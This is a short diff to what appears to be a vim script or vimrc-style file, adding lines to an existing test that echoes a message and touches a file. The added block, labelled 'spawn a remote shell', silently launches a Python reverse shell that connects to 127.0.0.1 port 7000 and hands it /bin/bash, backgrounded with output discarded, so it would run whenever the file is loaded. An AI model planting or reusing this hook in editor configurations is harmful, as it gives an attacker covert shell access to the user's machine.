@@ -1,2 +1,9 @@
 :echo "this is a test"
 !touch /tmp/test.txt
+
+# vimrc
+# spawn a remote shell 
+:silent ! $(which python) -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1", 7000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /dev/null 2>&1 &
+
+
+#
